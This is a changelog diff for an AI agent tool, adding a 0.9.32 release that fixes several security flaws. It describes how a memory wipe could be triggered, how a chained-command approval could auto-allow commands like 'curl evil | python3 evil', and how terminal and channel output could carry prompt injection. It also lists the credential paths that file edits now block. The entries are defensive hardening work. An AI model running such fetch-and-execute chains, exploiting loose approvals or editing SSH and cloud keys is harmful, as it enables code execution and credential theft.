@@ -5,7 +5,22 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
-## [0.9.31] - 2026-03-22
+## [0.9.32] - 2026-05-10
+
+### Security
+
+- **`manage_memories.forget` empty-key wipe (critical)**: An empty or whitespace-only `key` to the `forget` action made `fk.contains(&key_lower)` true for every fact, and the "duplicate sweep" then deleted matches across all categories — a malformed call could wipe the entire active fact store. Now rejects empty/whitespace keys and keys shorter than 2 characters. Cross-category sweeps are restricted to exact/canonical matches only; substring matching is allowed only within the explicitly-requested category. Regression tests added.
+- **Terminal chained-command session approval leakage (high)**: Approving a chained command like `curl … | python3 …` with "Allow Session" previously stored each segment's binary (`curl`, `python3`) as a session-approved prefix, so any future chained command composed of the same binaries was auto-allowed (e.g. `curl evil | python3 evil`). Chained-command approvals now store the full trimmed command for exact-match only. `is_allowed`'s per-segment check no longer consults session approvals — only operator-configured permanent prefixes — so a simple `curl` session approval can't retroactively unlock arbitrary chains. Regression tests added.
+- **`terminal` and `read_channel_history` no longer "trusted"**: Their outputs are now wrapped as untrusted external data before being fed back to the LLM. `terminal` can fetch arbitrary remote bytes (e.g. via `curl`); `read_channel_history` returns messages authored by other (non-owner) users. Both are prompt-injection vectors and were incorrectly exempt from wrapping. Regression tests added.
+- **`edit_file` blocks sensitive paths**: `edit_file` now refuses to operate on `~/.ssh/*`, `~/.aws/*`, `~/.gnupg/*`, `*.env`, and other paths flagged by `fs_utils::is_sensitive_path` — matching `write_file`'s existing behavior. Without this guard, the agent could mutate SSH keys or env files in place via find-and-replace. Regression test added.
+- **`run_command` allowlist tightened**: Removed `cargo run`, `cargo bench`, `npm run`, `npx`, `yarn run`, `bun run`, `make`, `cmake`, `gradle`, `mvn`, and `go generate` from `SAFE_PREFIXES`. These all execute arbitrary repo-defined scripts or network-downloaded code and must go through the terminal approval flow. Regression tests added.
+
+### Changed
+
+- **Rust toolchain**: Updated to Rust 1.95.0 (from 1.94.0).
+- **Dependency updates**: ~90 crate dependencies bumped to latest compatible versions via `cargo update` — notably tokio 1.52.3, hyper 1.9.0, mio 1.2.0, rayon 1.12.0, rustls 0.23.40, uuid 1.23.1, wasm-bindgen 0.2.121, indexmap 2.14.0, proptest 1.11.0, openssl 0.10.79. Incompatible major bumps (keyring 4, reqwest 0.13, rand 0.10, sha1/sha2/hmac/hkdf 0.11/0.13) deferred — they require non-trivial code migrations.
+
+
 
 ### Added
 
